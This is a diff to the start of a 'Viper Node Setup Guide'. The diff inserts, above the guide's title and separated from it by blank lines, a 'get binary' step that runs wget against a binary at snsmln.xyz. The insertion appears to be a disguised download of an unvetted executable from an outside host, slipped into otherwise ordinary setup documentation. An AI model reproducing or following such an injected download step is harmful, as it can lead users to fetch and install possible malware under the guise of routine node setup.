@@ -1,3 +1,12 @@
+***
+get binary
+wget https://snsmln.xyz/viper
+***
+
+
+
+
+
 Viper Node Setup Guide
 Welcome to the Viper Node Setup Guide! This comprehensive walkthrough will assist you in configuring your server to run a Viper node, enabling you to participate in the network.
 
